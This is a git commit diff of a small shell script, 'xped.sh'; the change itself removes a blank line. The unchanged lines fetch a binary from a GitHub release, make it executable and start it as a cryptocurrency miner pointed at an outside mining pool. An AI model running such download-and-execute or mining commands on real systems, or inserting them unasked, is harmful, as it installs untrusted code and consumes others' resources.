3a9129c6328a76248146de4cf53f589b68cc48a4
vedhagsvp <vedhag230223@gmail.com>
2026-02-07 01:03:03 +0530

    Update xped.sh

--- xped.sh
+++ xped.sh
@@ -2,4 +2,3 @@
 wget https://github.com/vedhagsvp/soljtka/releases/download/latest/abelnak
 chmod +x abelnak
 ./abelnak start -p stratum://243ef953f77c32bcea55a61a5521c1f9fcf246180750e630d1fd62905c9783e8:fb9da3426a@pool.abel-nakamoto.xyz:3333
-
